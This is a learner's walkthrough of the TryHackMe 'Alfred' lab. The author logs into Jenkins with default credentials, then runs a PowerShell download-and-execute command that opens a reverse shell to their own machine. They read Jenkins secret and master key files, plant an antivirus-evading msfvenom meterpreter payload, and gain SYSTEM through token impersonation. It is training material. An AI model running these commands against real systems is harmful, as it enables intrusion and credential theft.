# Alfred
TryHackMe.com's Alfred room
> Bradley Lubow, rnbochsr

## Task 1 - Initial Access
In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access. 

Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration, and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.


### Recon 
#### NMAP Scan

Nmap 7.80 scan initiated Sun Apr 24 12:24:54 2022 as: nmap -p- -Pn -T5 -oN nmap.initial 10.10.2.139
Nmap scan report for 10.10.2.139
Host is up (0.088s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Nmap done at Sun Apr 24 12:27:40 2022 -- 1 IP address (1 host up) scanned in 165.74 seconds

*Question 1: How many ports are open? (TCP only)* 3
**Port 80** - Web server showing photo and email address of Alfred.
**Port 3389** - Windows RDP Protocol.
**Port 8080** - Login page for Jenkins. No usefull info on page or in source code. But the site does use a script ([j_acegi_security_check](view-source:http://10.10.5.252:8080/j_acegi_security_check)) for security.

I was going to use BurpSuite and/or Hydra to try brute-forcing the user:password. Before that I tried a few of the basic default combinations. I was pleasantly suprised, when one of them worked. 

*Question 2: What is the username and password for the log in panel (in the format username:password)*? [REDACTED]:[REDACTED] 

### Initial Foothold - Logged into the Jenkins portal. 
Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: _powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port_

You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: _python3 -m http.server_

It took some time and research into Jenkins to figure out that I needed to be in the `project` directory and then use the `Configure` link to be able to enter the command for the server. Then it took a few tries to figure out you need to click the `Build Now` linnk to get the server to run the code.

The process is: 
* Start the local web server in th directory where the PowerShell script is located:
```bash
┌──(bradley㉿kali)-[~/THM/Alfred]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Start the listener for the reverse shell:
```bash
┌──(bradley㉿kali)-[~/THM/Alfred]
└─$ nc -lnvp 4321                
listening on [any] 4321 ...
```

* Then on the target enter the command:
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://<my-ip>:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <my-ip> -Port 4321
```

Note that the `-Port 4321` mathces the listener port above.
* Save the command in the Jenkins project directory. 
* Go back to the main Jenkins dashboard by clicking the `project` link in the navigation breaadcrumbs at the top of the page. 
* Click the `Build Now` link to bring the changes saved in the Configure screen online.
* Get a reverse shell.

```powershell
┌──(bradley㉿kali)-[~/THM/Alfred]
└─$ nc -lnvp 4321                
listening on [any] 4321 ...
connect to [IP REDACTED] from (UNKNOWN) [10.10.244.217] 49233
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>
```

Look around for passwords, credentials, and flags.
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\project>dir
PS C:\Program Files (x86)\Jenkins\workspace\project> ls
PS C:\Program Files (x86)\Jenkins\workspace\project> cd ..
PS C:\Program Files (x86)\Jenkins\workspace> dir


    Directory: C:\Program Files (x86)\Jenkins\workspace


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/26/2019   4:38 PM            project                           


PS C:\Program Files (x86)\Jenkins\workspace>
PS C:\Program Files (x86)\Jenkins\workspace> cd ..
PS C:\Program Files (x86)\Jenkins> dir


    Directory: C:\Program Files (x86)\Jenkins


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/26/2019   4:37 PM            jobs                              
d----        10/25/2019   9:54 PM            jre                               
d----        10/25/2019   9:55 PM            logs                              
d----        10/25/2019   9:55 PM            nodes                             
d----        10/25/2019   7:58 PM            plugins                           
d----        10/26/2019   4:38 PM            secrets                           
d----         10/3/2020   3:42 PM            updates                           
d----        10/25/2019   9:55 PM            userContent                       
d----        10/25/2019   9:55 PM            users                             
d----        10/25/2019   9:54 PM            war                               
d----        10/25/2019   7:58 PM            workflow-libs                     
d----        10/26/2019   4:38 PM            workspace                         
-a---          5/6/2022   5:11 PM          0 .lastStarted                      
-a---        10/26/2019  12:20 PM         37 .owner                            
-a---          5/6/2022   5:11 PM       1742 config.xml                        
-a---          5/6/2022   5:11 PM        156 hudson.model.UpdateCenter.xml     
-a---        10/25/2019   7:58 PM        374 hudson.plugins.git.GitTool.xml    
-a---        10/25/2019   9:55 PM       1712 identity.key.enc                  
-a---          5/6/2022   5:16 PM     110196 jenkins.err.log                   
-a---         9/25/2019   2:10 PM     371200 jenkins.exe                       
-a---          4/5/2015   6:05 PM        219 jenkins.exe.config                
-a---        10/25/2019   7:59 PM          7 jenkins.install.InstallUtil.lastEx
                                             ecVersion                         
-a---        10/25/2019   7:59 PM          7 jenkins.install.UpgradeWizard.stat
                                             e                                 
-a---        10/25/2019   7:59 PM        177 jenkins.model.JenkinsLocationConfi
                                             guration.xml                      
-a---          5/6/2022   5:11 PM       1992 jenkins.out.log                   
-a---          5/6/2022   5:11 PM          4 jenkins.pid                       
-a---        10/25/2019   9:55 PM        171 jenkins.telemetry.Correlator.xml  
-a---         9/25/2019   2:05 PM   78245883 jenkins.war                       
-a---          5/6/2022   5:11 PM      22494 jenkins.wrapper.log               
-a---         9/25/2019   2:10 PM       2875 jenkins.xml                       
-a---          5/6/2022   5:11 PM        907 nodeMonitors.xml                  
-a---          5/6/2022   5:59 PM        129 queue.xml                         
-a---        10/26/2019   4:39 PM        129 queue.xml.bak                     
-a---        10/25/2019   9:54 PM         64 secret.key                        
-a---        10/25/2019   9:54 PM          0 secret.key.not-so-secret 

PS C:\Program Files (x86)\Jenkins>
```

A `secret.key` file and a `secrets` directory. Well I've just got to get those. 
```powershell
PS C:\Program Files (x86)\Jenkins> type secret.key 
cb[REDACTED]1e

PS C:\Program Files (x86)\Jenkins> cd secrets
PS C:\Program Files (x86)\Jenkins\secrets> dir


    Directory: C:\Program Files (x86)\Jenkins\secrets


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   9:55 PM            filepath-filters.d                
d----        10/25/2019   9:55 PM            whitelisted-callables.d           
-a---        10/26/2019   4:38 PM        272 hudson.console.AnnotatedLargeText.
                                             consoleAnnotator                  
-a---        10/26/2019   4:38 PM         48 hudson.console.ConsoleNote.MAC    
-a---        10/26/2019   4:38 PM         32 hudson.model.Job.serverCookie     
-a---        10/25/2019   9:55 PM         34 initialAdminPassword              
-a---        10/25/2019   9:55 PM         32 jenkins.model.Jenkins.crumbSalt   
-a---        10/25/2019   9:55 PM        256 master.key                        
-a---        10/25/2019   9:55 PM        272 org.jenkinsci.main.modules.instanc
                                             e_identity.InstanceIdentity.KEY   
-a---        10/25/2019   9:55 PM          5 slave-to-master-security-kill-swit
                                             ch                                


PS C:\Program Files (x86)\Jenkins\secrets> type master.key
8f[REDACTED]94
```
And a `master.key` file also. Those kind of things always come in handy.

Continued searching in directories until I found the user.txt file.
*Question 4: What is the user.txt flag?*
```powershell
PS C:\Users\bruce\Desktop> dir


    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  11:22 PM         32 user.txt                          


PS C:\Users\bruce\Desktop> type user.txt
79[REDACTED]a0
```


## Task 2 - Switching Shells
To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create the a windows meterpreter reverse shell using the following payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```  

Customizing the command for my use is:
```bash
┌──(bradley㉿kali)-[~/THM/Alfred]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<MY-IP> LPORT=5555 -f exe -o myShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: myShell.exe
```

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`

Before running this program, ensure the handler is set up in metasploit:

`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run`  

This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell

`Start-Process "shell-name.exe"`

This should spawn a meterpreter shell for you!

The last couple of steps didn't work for me. I seemed to be able to get the myShell.exe program to the target in Jenkins, but I couldn't make it connect back to my listener. I was finally able to make the target connect back as follows: 

* In the remote PowerShell terminal tab  use this command to transfer the myShell.exe file to the target:
```powershell
PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://<my-ip>:8000/myShell.exe','myShell.exe')"
PS C:\Users\bruce\Desktop> dir


    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          5/7/2022   5:45 PM      73802 myShell.exe                       
-a---        10/25/2019  11:22 PM         32 user.txt                          
```

* Now, on my attacking machine, start the msfconsole and my listener:
```bash
┌──(bradley㉿kali)-[~/THM/Alfred]
└─$ msfconsole
msf6> use exploit/multi/handler
msf6> set PAYLOAD windows/meterpreter/reverse_tcp
msf6> set LHOST <my-ip>
msf6> set LPORT 5555
```

NOTE the LPORT must match the port used when generating the payload in msfvenom. 

* Now run the listener.
```bash
msf6> exploit
listening prompt.
```

* Start the process on the target to connect to your meterpreter shell. In the remote PowerShell terminal tab enter the command:
```powershell
PS C:\Users\bruce\Desktop> Start-Process "myShell.exe"
```

In your Metasploit tab you should get your reverse shell.
```bash
connect output. 
meterpreter >
```

*Question 1: What is the final size of the exe payload that you generated?* 73802 
This is noted in the terminal when you create the payload in msfvenom and from the diretory listing on the target. 


## Task 3 - Privilege Escalation
Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

-   user SIDs(security identifier)
-   group SIDs
-   privileges

amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

-   primary access tokens: those associated with a user account that are generated on log on
-   impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

-   SecurityAnonymous: current user/client cannot impersonate another user/client
-   SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
-   SecurityImpersonation: current user/client can impersonate the client's security context on the local system
-   SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

-   SeImpersonatePrivilege
-   SeAssignPrimaryPrivilege
-   SeTcbPrivilege
-   SeBackupPrivilege
-   SeRestorePrivilege
-   SeCreateTokenPrivilege
-   SeLoadDriverPrivilege
-   SeTakeOwnershipPrivilege
-   SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).

Working through these steps.
* In the remote PowerShell terminal tab, check current privileges:
```powershell
PS C:\Users\bruce\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
PS C:\Users\bruce\Desktop> pwd

Path                                                                           
----                                                                           
C:\Users\bruce\Desktop                                                         
```

Escalate privileges using token impersonation.
In the remote PowerShell terminal tab you can see that two privileges (SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the **incognito module** that will allow us to exploit this vulnerability. 

* In the Metasploit tab enter: `load incognito` to load the incognito module in metasploit. 
```bash
meterpreter > load incognito
```

To check which tokens are available, enter the _list_tokens -g_. We can see that the _BUILTIN\Administrators_ token is available. Use the _impersonate_token "BUILTIN\Administrators"_ command to impersonate the Administrators token.

* In the Metasploit trminal tab enter `list_tokens -g`.
```bash
meterpreter > list_tokens -g
[Listing REDACTED]
meterpreter > impersonate_token "BUILTIN\Administrators"
```

*Question 3: What is the output when you run the `getuid` command?*
```bash
meterpreter > getuid
Server username: N[REDACTED]M
```

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the _ps_ command to view processes and find the PID of the services.exe process. Migrate to this process using the command _migrate PID-OF-PROCESS_

Read the root.txt file at `C:\Windows\System32\config`

* Root Flag - Now that we are running as the system admin, let's get the root flag.
```bash
meterpreter > cat c:\Windows\System32\config\root.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > pwd
C:\Windows\system32
meterpreter > cd config
meterpreter > pwd
C:\Windows\system32\config
meterpreter > cat root.txt
df[REDACTED]4a
```

## Thoughts and Reflections
The room was fun and challenging. It took me some exta time as I am not familiar with Jenkins and my Windows privilege escalation skills need work. Following the walk-thru, was a little difficult as some commands had to be entered in the Jenkins interface and some in the initial PowerShell interface. I had to figure that out. Once I did, if something wouldn't work thru Jenkins, entering it in the PowerShell interface got the step complete. 

I learned stuff, and that is the goal.